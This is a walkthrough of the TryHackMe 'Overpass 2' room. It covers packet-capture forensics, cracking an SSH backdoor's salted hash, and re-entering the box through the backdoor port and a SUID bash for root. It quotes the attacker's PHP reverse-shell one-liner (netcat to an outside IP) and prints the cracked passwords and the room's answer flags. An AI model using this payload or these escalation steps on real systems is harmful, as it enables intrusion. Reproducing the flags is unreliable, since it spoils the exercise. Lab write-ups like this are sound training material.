# TryHackMe-Overpass 2

## Forensics-Analyse the PCAP

1. What was the URL of the page they used to upload a reverse shell?

<img src="https://imgur.com/KFBqeZb.png"/>

`development`


2. What payload did the attacker use to gain access?

  <img src="https://imgur.com/HkQQ5TT.png"/>

`<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>`


3. What password did the attacker use to privesc?

 <img src="https://imgur.com/ybqgbuh.png"/>

Follow the tcp stream from packet `4` and change the stream until you see something interesting

	 `whenevernoteartinstant`

4. How did the attacker establish persistence?
	
   <img src="https://imgur.com/ocwiDNb.png"/>

  `https://github.com/NinjaJc01/ssh-backdoor`


5. Using the fasttrack wordlist, how many of the system passwords were crackable?

Store the hashes in a text file for cracking

 <img src="https://imgur.com/xZXW6Mx.png"/>

 <img src="https://imgur.com/8RRXeEj.png"/>

`4`

## Research-Analyse the code

1. What's the default hash for the backdoor?

Visit the github for the ssh-backdoor

<img src="https://imgur.com/g29RECF.png"/>

`bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3`


2. What's the hardcoded salt for the backdoor?
<img src="https://imgur.com/vzO9sou.png"/>

You can find the `salt` being passed to `verifypass` function

`1c362db832f3f864c8c2fe05f2002a05`

3. What was the hash that the attacker used? - go back to the PCAP for this!
  <img src="https://imgur.com/axBHZVo.png"/>

 `6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed`

4. Crack the hash using rockyou and a cracking tool of your choice. What's the password?

Since the hash is SHA512 we are going to use hashcat and for that we have to find the mode for that hash so we can specify it to crack

<img src="https://imgur.com/WTa7Gzj.png"/>

But doing this didn't help as this is salted so we know the default hash that this backdoor uses so add the default salt to the hash 

```
6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05
```
<img src="https://imgur.com/DVCgt3R.png"/>

<img src="https://imgur.com/8vCm4mr.png"/>

`november16`


## Attack-Get back in!

### NMAP

```
nmap -sC -sV 10.10.196.150
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-28 21:06 PKT
Stats: 0:00:28 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.75% done; ETC: 21:06 (0:00:00 remaining)
Stats: 0:00:28 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.75% done; ETC: 21:06 (0:00:00 remaining)
Nmap scan report for 10.10.196.150
Host is up (0.16s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e4:3a:be:ed:ff:a7:02:d2:6a:d6:d0:bb:7f:38:5e:cb (RSA)
|   256 fc:6f:22:c2:13:4f:9c:62:4f:90:c9:3a:7e:77:d6:d4 (ECDSA)
|_  256 15:fd:40:0a:65:59:a9:b5:0e:57:1b:23:0a:96:63:05 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: LOL Hacked
2222/tcp open  ssh     OpenSSH 8.2p1 Debian 4 (protocol 2.0)
| ssh-hostkey: 
|_  2048 a2:a6:d2:18:79:e3:b0:20:a2:4f:aa:b6:ac:2e:6b:f2 (RSA)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.99 seconds
```

1. The attacker defaced the website. What message did they leave as a heading? 

<img src="https://imgur.com/drl11Rf.png"/>

`H4ck3d by CooctusClan`

 
2. What's the user flag?

Now there are two ports open for SSH 

<img src="https://imgur.com/qylGgeA.png"/>

Port 22 didn't work but port 2222 did as we saw from the nmap scan it is another ssh port

`thm{d119b4fa8c497ddb0525f7ad200e6567}`

3. What's the root flag?

The binary `.suid_bash` has SUID permissions that can execute has the owner of that file so with `./.suid_bash -p` this -p will allow to run as the permissions of that users


<img src="https://imgur.com/98tz8np.png"/>

`thm{d53b2684f169360bb9606c333873144d}`